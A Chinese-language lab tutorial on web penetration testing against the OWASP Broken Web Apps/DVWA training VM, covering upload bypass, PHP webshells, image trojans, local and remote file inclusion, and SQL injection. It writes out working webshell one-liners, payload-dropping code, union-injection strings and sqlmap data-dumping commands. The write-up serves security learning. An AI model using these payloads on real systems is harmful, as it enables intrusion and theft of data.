## 1.渗透环境搭建

目标靶机：OWASP基金会

https://sourceforge.net/projects/owaspbwa/files/1.2/OWASP_Broken_Web_Apps_VM_1.2.zip/download

准备渗透测试机器：

- kali linux
- windows ：用于提供中国菜刀、蚁剑等连接工具

---



## 2.文件上传漏洞

### 1. low级别（没有限制文件的上传类型）

a. 首先，登录owasp网页：

- 账号：admin   密码：admin

![image-20220831201237558](C:\Users\xtanx\Desktop\typora\.assets\image-20220831201237558.png)

b. 调整安全级别：

![image-20220831201546801](C:\Users\xtanx\Desktop\typora\.assets\image-20220831201546801.png)

c. 然后，准备恶意php代码：

- php代码的内容如下：

```php
<?php @eval($_POST['password']);?>
```

d. 上传准备好的php恶意代码文件：

![image-20220831202825534](C:\Users\xtanx\Desktop\typora\.assets\image-20220831202825534.png)

e. 登陆windows渗透测试机器，打开中国菜刀连接：

右击点击添加，

![image-20220831223738830](C:\Users\xtanx\Desktop\typora\.assets\image-20220831223738830.png)

进入文件管理，

![image-20220831224002683](C:\Users\xtanx\Desktop\typora\.assets\image-20220831224002683.png)

### 2. medium 中安全级别，定义允许上传文件的mime类型

- 后端代码限制了上传文件的<u>mime</u>类型：<u>image/jpeg</u>

- 使用<u>burpsuite</u>的代理拦截功能，修改文件的<u>mime</u>类型。

a. 开启burpsuite的代理功能（直接在kali上面操作）

选择 proxy - options，添加端口代理转发：

![image-20220901215309446](C:\Users\xtanx\Desktop\typora\.assets\image-20220901215309446.png)

b. 开启代理拦截功能：

![image-20220901215727626](C:\Users\xtanx\Desktop\typora\.assets\image-20220901215727626.png)

c. 打开windows渗透机器，配置火狐浏览器使用burpsuite代理：

![image-20220901220128755](C:\Users\xtanx\Desktop\typora\.assets\image-20220901220128755.png)

d. 上传php文件：

![image-20220901220521106](C:\Users\xtanx\Desktop\typora\.assets\image-20220901220521106.png)

e. 此时，请求被burpsuite拦截了，这边将Content-Type类型改成 image/jpeg，然后点击Forward转发：

![image-20220901220937674](C:\Users\xtanx\Desktop\typora\.assets\image-20220901220937674.png)

此时我们可以看到已经上传成功了

![image-20220901221155128](C:\Users\xtanx\Desktop\typora\.assets\image-20220901221155128.png)

### 3. high高安全级别，限制了文件的后缀名

---



## 3.webshell

- 小马：一句话木马，即整个shell代码只有一行，一般是系统执行函数

- 大马：代码量和功能比小马多，一般会进行二次编码加密，防止被安全防火墙入侵系统检测到

*eval 调用函数*

```php
<?php eval($_REQUEST['cmd']);?>
```

例如：http://10.61.8.209/dvwa/hackable/uploads/shell1.php?cmd=phpinfo();

*system 使用linux系统命令*

```php
<?php system($_REQUEST['variable']);?>
```

例如：http://10.61.8.209/dvwa/hackable/uploads/shell2.php?variable=cat /etc/passwd

**说明： REQUEST是在网页输入变量访问，POST则是使用中国菜刀之类的工具连接，是c/s架构。所以我一般用POST方式更方便。**

中国菜刀：

```php
<?php @eval($_POST['chopper']);?>
```

---



## 4.中国菜刀的三大功能

- 文件管理
- 数据库管理
- 虚拟终端

数据库管理：

![image-20220901223018762](C:\Users\xtanx\Desktop\typora\.assets\image-20220901223018762.png)

```mysql
<T>MYSQL</T>
<H>localhost</H>
<U>root</U>
<P>owaspbwa</P>
```

右击，进入数据库：

![image-20220901223236403](C:\Users\xtanx\Desktop\typora\.assets\image-20220901223236403.png)

---



## 5.文件包含漏洞

### 1.通过主程序里的include包含

![image-20220902103502243](C:\Users\xtanx\Desktop\typora\.assets\image-20220902103502243.png)

例如：

![image-20220902121843856](C:\Users\xtanx\Desktop\typora\.assets\image-20220902121843856.png)

### 2.本地文件包含

- 通过文件上传木马文件
- 执行包含上传的木马文件，生成恶意php代码文件

```shell
if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG")
```

上面提到文件上传漏洞的高安全级别下，对文件的后缀做了限制，所以我们只能上传图片文件

**a. 制作一句话木马图片文件duck1.jpg：**

- 准备shell.php文件，内容如下：

```php
<?fputs(fopen("shell2.php", "w"),'<?php eval($_POST[password]);?>')?>
```

方法一：windows命令

```shell
> copy duck.jpg/b+shell.php duck1.jpg     #通过duck.jpg加上恶意代码shell.php生成木马图片duck1.jpg
```

![image-20220902123943445](C:\Users\xtanx\Desktop\typora\.assets\image-20220902123943445.png)

方法二：edjpgcom工具

将图片拖动到.exe执行文件：

![image-20220902131009198](C:\Users\xtanx\Desktop\typora\.assets\image-20220902131009198.png)

![image-20220902131049745](C:\Users\xtanx\Desktop\typora\.assets\image-20220902131049745.png)

在空白框填入我们的代码：

```php
<?fputs(fopen("shell2.php", "w"),'<?php eval($_POST[password]);?>')?>
```

**b. 上传木马图片**

![image-20220902125209662](C:\Users\xtanx\Desktop\typora\.assets\image-20220902125209662.png)

**c. 执行包含图片文件**

查看图片文件路径：

![image-20220902125503781](C:\Users\xtanx\Desktop\typora\.assets\image-20220902125503781.png)

执行：

![image-20220902125926601](C:\Users\xtanx\Desktop\typora\.assets\image-20220902125926601.png)

**d. 查看已经生成木马文件shell2.php**

![image-20220902130411724](C:\Users\xtanx\Desktop\typora\.assets\image-20220902130411724.png)

**e. 然后通过菜刀连接**：https://192.168.254.177/dvwa/vulnerabilities/fi/shell2.php

### 3.远程文件包含

1.准备远程文件

找一台远程服务器，可以提供网站服务的。通过远程包含的文件去生成木马文件

我这里使用kali来做远程服务器:

```shell
$ systemctl start apache2     # 启动apache服务
$ vim /var/www/html/a.txt
<?fputs(fopen("shell2.php", "w"),'<?php eval($_POST[password]);?>')?>

```

2.执行远程包含文件![image-20220902161827937](C:\Users\xtanx\Desktop\typora\.assets\image-20220902161827937.png)

查看已经成功生成木马文件shell2.php

![image-20220902162028271](C:\Users\xtanx\Desktop\typora\.assets\image-20220902162028271.png)

- 中安全级别：

![image-20220902215319661](C:\Users\xtanx\Desktop\typora\.assets\image-20220902215319661.png)

可以看到，在中安全级别下，包含的文件对 http和https做了替换为空的操作。

我在这里再插入一个 http:// 用来处理被替换的情况。即使它给我替换成空，我还是存在一个 http:// ，如下：

![image-20220902215815476](C:\Users\xtanx\Desktop\typora\.assets\image-20220902215815476.png)

- 高安全级别

![image-20220902220013547](C:\Users\xtanx\Desktop\typora\.assets\image-20220902220013547.png)

高安全级别下，后端代码写死了，只能包含 include.php这个文件！

---



## 6.SQL注入

### 1.了解数据库基础查询

布尔查询：

```mysql
mysql> select user_id,first_name,last_name from dvwa.users where user_id='10' or 1=1;   # 这条语句只能查询到dvwa.users表中user_id,first_name和last_name字段的所有数据
```

联合查询：

- 注：union查询前后字段数必须相同

```mysql
mysql> select user,password from mysql.user union select user_id,first_name from dvwa.users;
mysql> select user,password from mysql.user union select 1,2;
```

介绍一个重要的库：information_schema

- 这张表记录了所有库和表的信息！

查询所有的库：

```mysql
mysql> select SCHEMA_NAME from information_schema.SCHEMATA;
mysql> select distinct table_schema from information_schema.tables;    # distinct去重
# 这两条语句都是查询库信息
```

查询所有的表：

```mysql
mysql> select table_name from information_schema.tables;   # 查询所有库的所有表
mysql> select table_name from information_schema.tables where table_schema='dvwa';  # 查询某个库的所有表
```

查询所有的字段：

```mysql
mysql> select COLUMN_NAME from information_schema.columns;
mysql> select COLUMN_NAME from information_schema.columns where table_schema='dvwa' and table_name='users';
# 查询某个库某个表的字段
```

让表名 TABLE_NAME 字段，按照库名 TABLE_SCHEMA 字段分组

```mysql
mysql> select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G;
```

### 2.手动注入

1.基于错误的注入

- 错误注入的思路是通过构造特殊的sql语句，根据得到的错误信息，确认sql注入点；

- 通过数据库报错的信息，也可以探测到数据库的类型和其他有用的信息；

- 通过输入单引号，触发数据库异常，通过异常日志诊断数据库类型，例如这里是MySQL数据库。

2.基于布尔的注入

```mysql
原始语句：
mysql> select first_name,last_name from dvwa.users where user_id='';
SQL注入语句解析： '  or 1=1 --     # 单引号（'） 为了闭合前面的条件
语句变成：
mysql> select first_name,last_name from dvwa.users where user_id='  '  or 1=1 -- ';
```

3.基于union的注入

UNION语句用于联合前面的select查询语句，合并查询更多信息；

```mysql
# 首先猜测数据库列数
' union select 1 -- '
' union select 1,2 -- '
' union select 1,2,3 -- '
' union select 1,2,3,4 -- '
mysql> select first_name,last_name from dvwa.users where user_id=' ' union select 1,2 -- ' ';

# 查询所有的库名
'union select TABLE_SCHEMA,1 from information_schema.tables -- ';
mysql> select first_name,last_name from dvwa.users where user_id=' ' union select TABLE_SCHEMA,1 from information_schema.tables -- ' ';

# 查询库中所有表名
'union select TABLE_NAME,1 from information_schema.tables -- ' ;
mysql> select first_name,last_name from dvwa.users where user_id=' 'union select TABLE_NAME,1 from information_schema.tables -- ' ';

# 获取库名
'union select database(), 1 -- ' ;

# 如果想看多个字段的值
mysql> select first_name,last_name from dvwa.users where user_id=' ' union select password, concat(first_name,' ',last_name,' ',user) from users -- '';

```

4.基于SQL盲注

###

### 3.SQLmap自动注入

1.sqlmap用法

- 查看sqlmap的帮助

```shell
$ sqlmap -h
$ sqlmap -hh   # 获得详细信息
```

```shell
$ sqlmap -u "http://xxxxxx" --batch
$ sqlmap -u "http://xxxxxx" --batch --dbs   # 获取所有数据库信息
$ sqlmap -u "http://xxxxxx" --batch -D "库名" --tables   # 获取某个库下面的表
$ sqlmap -u "http://xxxxxx" --batch -D "库名" -T "表名" --columns     # 获取某个库下某张表的字段
$ sqlmap -u "http://xxxxxx" --batch -D "库名" -T "表名" --columns --dump-all    # 获取数据
```

sqlmap利用Cookie参数：

```shell
$ sqlmap -u "http://10.61.8.209/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch  --cookie="PHPSESSID=bsi7u0bdk4h8tmi2o9udj8s280;security=low"
```

2.提权操作

与数据库交互： --sql-shell

```shell
$ sqlmap -u "http://10.61.8.209/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch --cookie="PHPSESSID=bsi7u0bdk4h8tmi2o9udj8s280;security=low" --sql-shell
```

